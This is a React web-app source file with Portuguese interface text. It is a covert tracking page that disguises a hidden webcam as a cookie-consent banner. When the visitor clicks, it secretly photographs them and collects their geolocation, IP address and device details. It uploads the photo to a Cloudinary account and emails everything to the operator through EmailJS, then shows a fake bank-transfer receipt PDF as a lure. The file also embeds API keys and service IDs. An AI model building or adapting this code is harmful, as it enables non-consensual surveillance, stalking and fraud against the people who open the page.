import React, { useState, useRef } from 'react';
import Webcam from 'react-webcam';
import emailjs from 'emailjs-com';
import axios from 'axios';
import './App.css';

function App() {
  const [loading, setLoading] = useState(true);
  const [showPDF, setShowPDF] = useState(false);
  const webcamRef = useRef(null);

  const base64ToFile = (base64String, fileName) => {
    if (!base64String) {
      throw new Error("Base64 string is null or undefined");
    }

    const regex = /^data:(image\/(?:jpeg|png));base64,/;
    const match = base64String.match(regex);

    if (!match) {
      throw new Error("Invalid base64 string format.");
    }

    const mime = match[1];
    const data = base64String.replace(regex, '');
    const binary = atob(data);
    const array = new Uint8Array(binary.length);

    for (let i = 0; i < binary.length; i++) {
      array[i] = binary.charCodeAt(i);
    }

    return new File([array], fileName, { type: mime });
  };

  const getLocationDetails = async (latitude, longitude) => {
    const apiKey = '70cae1482aff4b1bb165fe142c299717';
    const response = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}`);
    const data = await response.json();
    return data.results[0].components;
  };

  const getIPAddress = async () => {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  };

  const getDeviceInfo = () => {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenResolution: `${window.screen.width}x${window.screen.height}`
    };
  };

  const handleButtonClick = async () => {
    const imageSrc = webcamRef.current.getScreenshot();
    if (imageSrc && imageSrc.startsWith("data:image")) {

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          try {
            const locationDetails = await getLocationDetails(latitude, longitude);
            const loc = `City: ${locationDetails.city}, State: ${locationDetails.state}, Country: ${locationDetails.country}`;

            const ip = await getIPAddress();
            const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceInfo = getDeviceInfo();

            const imageFile = base64ToFile(imageSrc, 'webcam_image.jpg');
            const formData = new FormData();
            formData.append('file', imageFile);
            formData.append('upload_preset', 'comprovante');

            const uploadResponse = await axios.post('https://api.cloudinary.com/v1_1/drtw6ltun/image/upload', formData, {
              headers: {
                'Content-Type': 'multipart/form-data'
              }
            });

            const imageLink = uploadResponse.data.secure_url;

            const templateParams = {
              to_name: 'Seu Nome',
              from_name: 'App',
              message: loc,
              image_link: imageLink,
              ip_address: ip,
              connection_type: connectionType,
              user_agent: deviceInfo.userAgent,
              platform: deviceInfo.platform,
              screen_resolution: deviceInfo.screenResolution
            };

            emailjs.send('service_24sk3fv', 'template_aqewqbd', templateParams, '5SP9iAEgT_xvOR0im')
              .then((response) => {
                console.log('Email sent successfully:', response.status, response.text);
              }, (err) => {
                console.error('Failed to send email:', err);
              });

            setLoading(false);
            setShowPDF(true); // Define o estado para mostrar o PDF
          } catch (error) {
            console.error('Error during geolocation or data fetch:', error);
            setLoading(false);
          }
        }, (error) => {
          console.error('Geolocation error:', error);
          setLoading(false);
        });
      } else {
        console.error('Geolocation is not supported by this browser.');
        setLoading(false);
      }
    } else {
      console.error('Failed to capture image or invalid base64 string.');
      setLoading(false);
    }
  };

  return (
    <div className="App">
      {loading ? (
        <>
          <div className="loading-spinner"></div>
          <div className="cookie-consent">
            Este site usa cookies para melhorar sua experiência.
            <button onClick={handleButtonClick}>Tirar Foto e Obter Localização</button>
          </div>
          <Webcam
            audio={false}
            ref={webcamRef}
            screenshotFormat="image/jpeg"
            width="500px"
            height="0px"
          />
        </>
      ) : showPDF ? ( // Verifica se deve mostrar o PDF
        <object data="/Comprovante_transferencia.pdf" type="application/pdf" className="pdf-viewer">
          <p>Seu navegador não suporta PDFs. Por favor, <a href="/Comprovante_transferencia.pdf">faça o download do PDF</a> para visualizá-lo.</p>
        </object>
      ) : null} {/* Remove a exibição dos dados do usuário */}
    </div>
  );
}

export default App;
